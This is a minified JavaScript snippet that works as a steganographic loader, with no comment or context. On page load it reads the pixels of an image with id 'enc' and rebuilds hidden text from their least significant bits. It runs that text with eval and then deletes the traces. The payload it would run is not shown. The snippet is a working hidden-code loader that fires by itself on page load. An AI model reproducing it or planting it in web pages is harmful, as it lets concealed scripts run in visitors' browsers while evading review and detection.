function decode(e){for(var t=[],r="",n=0;n<e.length;n++)if((n+1)%4!=0){var a=1&e[n];if(8==r.length){if(255==parseInt(r,2))return t;t.push(String.fromCharCode(parseInt(r,2))),r=""}r+=""+a}return t}window.addEventListener("load",function(){var c=document.createElement("canvas"),b=c.getContext("2d"),r=document.getElementById("enc");c.width=r.width,c.height=r.height,b.drawImage(r,0,0);var m=b.getImageData(0,0,r.width,r.height),x=decode(m.data);eval(x.join(""));delete x; delete m; c.remove();});
